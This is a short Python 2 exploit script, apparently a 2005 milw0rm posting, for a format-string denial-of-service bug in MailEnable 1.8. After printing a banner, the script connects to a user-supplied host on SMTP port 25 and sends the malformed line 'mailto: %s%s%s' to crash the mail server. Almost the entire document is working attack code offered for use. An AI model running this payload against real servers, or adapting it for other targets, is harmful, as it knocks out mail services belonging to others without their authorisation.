                                                                                                                                                                                                                                                               ##################################################################
#                                                                #
#               See-security Technologies ltd.                   #
#                                                                #
#                http://www.see-security.com                     #
#                                                                #
##################################################################
#                                                                #
#          MailEnable 1.8 Format String DoS exploit              #
#                                                                #
#                Discovered by Mati Aharoni                      #
#                                                                #
#                   Coded by tal zeltzer                         #
#                                                                #
##################################################################


import sys
import time
import socket


def PrintLogo():
	print "##################################################################"
	print "#                                                                #"
	print "#               See-security Technologies ltd.                   #"
	print "#                                                                #"
	print "#                http://www.see-security.com                     #"
	print "#                                                                #"
	print "##################################################################"
	print "#"+" "*64+"#"
	print "#          MailEnable 1.8 Format String DoS exploit              #"
	print "#"+" "*64+"#"
	print "#                Discovered by Mati Aharoni                      #"
	print "#                                                                #"
	print "#                   Coded by tal zeltzer                         #"
	print "#"+" "*64+"#"
	print "#"*66+"\n"


PrintLogo()
if (len(sys.argv) != 2):
	print "\n\n"
	print sys.argv[0] + " [Target Host]"
	sys.exit()
sSmtpSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print "[-] Connecting to " + sys.argv[1]
sSmtpSocket.connect((sys.argv[1],25))
print "[-] Connected to " + sys.argv[1]
print "[-] Sending malformed packet"
sSmtpSocket.send("mailto: %s%s%s\r\n")
sSmtpSocket.close()
print "[-] Malformed packet sent"


# milw0rm.com [2005-03-17]